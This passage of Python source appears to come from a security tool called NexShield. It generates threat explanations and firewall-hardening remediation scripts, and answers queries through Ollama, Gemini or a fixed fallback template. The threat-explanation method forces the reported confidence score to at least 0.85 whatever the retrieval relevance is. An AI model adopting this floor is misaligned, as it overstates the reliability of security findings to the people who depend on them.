        self.retriever = retriever
        self.backend = os.environ.get("RAG_BACKEND", "local").lower()
        self.ollama_host = os.environ.get("OLLAMA_HOST", "http://localhost:11434")
        self.ollama_model = os.environ.get("OLLAMA_MODEL", "llama3")
        self.gemini_key = os.environ.get("GEMINI_API_KEY", "")
        self.openai_key = os.environ.get("OPENAI_API_KEY", "")

    def generate_threat_explanation(self, threat: Dict[str, Any]) -> Dict[str, Any]:
        """
        Synthesizes a deep contextual explanation, attack path analysis,
        and citations for a specific threat document.
        """
        results = self.retriever.retrieve_for_threat(threat, top_k=3)
        citations = []
        mitigation_snippets = {"ansible": [], "powershell": [], "bash": []}

        for r in results:
            doc = r.document
            citations.append({
                "doc_id": doc.doc_id,
                "title": doc.title,
                "category": doc.category,
                "relevance": r.score,
            })
            if doc.remediation:
                for k in ("ansible", "powershell", "bash"):
                    if doc.remediation.get(k):
                        mitigation_snippets[k].extend(doc.remediation[k])

        # Synthesize technical explanation using deterministic grounding
        name = threat.get("name", "Vulnerability")
        host = threat.get("host", "Target Host")
        port = threat.get("port") or threat.get("port_info", {}).get("port", "N/A")
        cve_id = threat.get("cve_id", "")
        detail = threat.get("detail", "")

        primary_doc = results[0].document if results else None
        kb_context = primary_doc.content if primary_doc else "Standard security hardening applies."

        explanation = (
            f"Threat analysis for '{name}' on host {host} (Port: {port}):\n\n"
            f"• Technical Impact: {kb_context}\n\n"
            f"• Attack Path & Lateral Risk: If left unmitigated, attackers can abuse this vector "
            f"to establish persistence, attempt credential spraying, or pivot towards adjacent subnets. "
            f"{detail}"
        )

        return {
            "threat_name": name,
            "host": host,
            "cve_id": cve_id,
            "explanation": explanation,
            "citations": citations,
            "remediation_snippets": mitigation_snippets,
            "confidence_score": max(0.85, round(results[0].score, 2)) if results else 0.75,
            "generated_at": datetime.now(timezone.utc).isoformat(),
        }

    def generate_dynamic_remediation(self, host: str, host_threats: List[Dict[str, Any]], fmt: str = "ansible") -> str:
        """
        Dynamically synthesizes custom Ansible, PowerShell, or Bash playbooks
        by retrieving exact mitigation code for all threats present on the host.
        """
        fmt = fmt.lower().strip()
        tasks_or_lines: List[str] = []
        used_citations: set = set()

        # Collect unique ports and services
        for t in host_threats:
            results = self.retriever.retrieve_for_threat(t, top_k=2)
            for r in results:
                doc = r.document
                if doc.doc_id not in used_citations and doc.remediation.get(fmt):
                    used_citations.add(doc.doc_id)
                    tasks_or_lines.extend(doc.remediation[fmt])

        if not tasks_or_lines:
            # Fallback to general firewall and host baseline hardening
            if fmt == "ansible":
                tasks_or_lines = [
                    f"- name: General Host Hardening for {host}",
                    "  ansible.builtin.debug:",
                    f"    msg: 'Auditing security posture for host {host}. Ensure firewall is enabled.'",
                    "- name: Ensure standard firewall is active",
                    "  ansible.builtin.service:",
                    "    name: ufw",
                    "    state: started",
                    "  ignore_errors: true",
                ]
            elif fmt == "powershell":
                tasks_or_lines = [
                    f"# General Host Hardening for {host}",
                    "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
                    "Get-Service -Name LanmanServer,TermService | Where-Object Status -eq 'Running'",
                ]
            else:
                tasks_or_lines = [
                    f"# General Host Hardening for {host}",
                    "sudo ufw enable",
                    "sudo ufw default deny incoming",
                    "sudo ufw default allow outgoing",
                ]

        if fmt == "ansible":
            header = [
                "---",
                f"# NexShield RAG Dynamic Remediation Playbook",
                f"# Target Host: {host}",
                f"# Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}",
                f"# Grounded Knowledge Sources: {', '.join(sorted(used_citations)) or 'CIS Baseline'}",
                f"- name: Harden and Remediate Threats on {host}",
                f"  hosts: {host}",
                "  become: true",
                "  tasks:",
            ]
            # Indent tasks properly
            indented = []
            for line in tasks_or_lines:
                if line.startswith("- name:"):
                    indented.append("    " + line)
                else:
                    indented.append("    " + line)
            return "\n".join(header + indented)

        elif fmt == "powershell":
            header = [
                f"# ═════════════════════════════════════════════════════════════════",
                f"#  NexShield RAG Dynamic Remediation Script (PowerShell)",
                f"#  Target Host: {host}",
                f"#  Sources: {', '.join(sorted(used_citations)) or 'Baseline'}",
                f"# ═════════════════════════════════════════════════════════════════",
                "",
                "# Requires -RunAsAdministrator",
                "$ErrorActionPreference = 'SilentlyContinue'",
                "",
            ]
            return "\n".join(header + tasks_or_lines)

        else:  # bash
            header = [
                f"#!/usr/bin/env bash",
                f"# ═════════════════════════════════════════════════════════════════",
                f"#  NexShield RAG Dynamic Remediation Script (Bash)",
                f"#  Target Host: {host}",
                f"#  Sources: {', '.join(sorted(used_citations)) or 'Baseline'}",
                f"# ═════════════════════════════════════════════════════════════════",
                "set -euo pipefail",
                "",
            ]
            return "\n".join(header + tasks_or_lines)

    def answer_query(self, user_query: str, host: Optional[str] = None, threat_id: Optional[str] = None) -> Dict[str, Any]:
        """
        Interactive RAG Security Copilot endpoint: Answers natural language questions
        grounded in the local cybersecurity knowledge store and host scan data.
        """
        # Retrieve context
        results = self.retriever.retrieve(user_query, top_k=4)

        citations = []
        context_blocks = []
        for r in results:
            doc = r.document
            citations.append({
                "doc_id": doc.doc_id,
                "title": doc.title,
                "category": doc.category,
                "relevance": r.score,
            })
            context_blocks.append(f"[{doc.doc_id}] {doc.title}:\n{doc.content}")

        combined_context = "\n\n".join(context_blocks)

        # Check if user asked to use cloud or ollama backend, else fallback to deterministic synthesizer
        llm_answer = None
        if self.backend == "ollama":
            llm_answer = self._call_ollama(user_query, combined_context)
        elif self.backend == "gemini" and self.gemini_key:
            llm_answer = self._call_gemini(user_query, combined_context)

        if not llm_answer:
            # Deterministic, grounded security reasoning
            primary = results[0].document if results else None
            if primary:
                llm_answer = (
                    f"### Security Analysis & Grounded Assessment\n\n"
                    f"Based on NexShield's local cybersecurity intelligence:\n\n"
                    f"**1. Core Finding:**\n{primary.content}\n\n"
                    f"**2. Tactical Guidance:**\n"
                    f"To mitigate this risk according to industry standards ({primary.doc_id}), "
                    f"enforce least-privilege network access, apply vendor patches, and verify firewall isolation.\n\n"
                    f"**3. Automated Remediation:**\n"
                    f"Custom automated scripts (Ansible, PowerShell, Bash) can be deployed directly from the Host details drawer."
                )
            else:
                llm_answer = (
                    "No matching threat signature found in local knowledge bases for this query. "
                    "Ensure your services are not exposed to untrusted networks and check firewall access controls."
                )

        return {
            "query": user_query,
            "answer": llm_answer,
            "citations": citations,
            "backend_used": self.backend if llm_answer and self.backend != "local" else "builtin_local",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    def _call_ollama(self, query: str, context: str) -> Optional[str]:
        """Calls local Ollama instance if available."""
        try:
            import requests  # type: ignore
            prompt = (
                f"You are NexShield's autonomous Cybersecurity AI Analyst. "
                f"Answer the question using the following verified security context:\n\n"
                f"{context}\n\n"
                f"Question: {query}\n\n"
                f"Provide a concise, professional answer with actionable remediation advice."
            )
            resp = requests.post(
                f"{self.ollama_host}/api/generate",
                json={"model": self.ollama_model, "prompt": prompt, "stream": False},
                timeout=10,
            )
            if resp.status_code == 200:
                return resp.json().get("response", "")
        except Exception as e:
            logger.debug(f"Ollama call failed: {e}")
        return None

    def _call_gemini(self, query: str, context: str) -> Optional[str]:
        """Calls Gemini API if GEMINI_API_KEY is present."""
        try:
            import requests  # type: ignore
            url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={self.gemini_key}"
            prompt = (
                f"You are NexShield's autonomous Cybersecurity AI Analyst. "
                f"Answer the question using the verified security intelligence:\n\n{context}\n\n"
                f"Question: {query}"
            )
            payload = {"contents": [{"parts": [{"text": prompt}]}]}
            resp = requests.post(url, json=payload, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data["candidates"][0]["content"]["parts"][0]["text"]
        except Exception as e:
            logger.debug(f"Gemini call failed: {e}")
        return None


# ═════════════════════════════════════════════════════════════════════
#  Singleton Module Instance & Auto-Initialization
# ═════════════════════════════════════════════════════════════════════

knowledge_store = SecurityKnowledgeStore()
rag_retriever = RAGRetriever(knowledge_store)
rag_generator = RAGGenerator(rag_retriever)


def initialize_rag_subsystem():
    """Initializes the RAG subsystem in a background worker."""
    def _worker():
        try:
            ingested = knowledge_store.ingest_cve_files(max_cves=300)
            knowledge_store.build_vector_index()
            logger.info(f"RAG Subsystem ready with {len(knowledge_store.all_documents())} docs ({ingested} CVEs ingested).")
        except Exception as e:
            logger.warning(f"RAG Subsystem background indexing warning: {e}")

    thread = threading.Thread(target=_worker, daemon=True, name="NexShield-RAG-Init")
    thread.start()


# Kick off background initialization upon import
initialize_rag_subsystem()
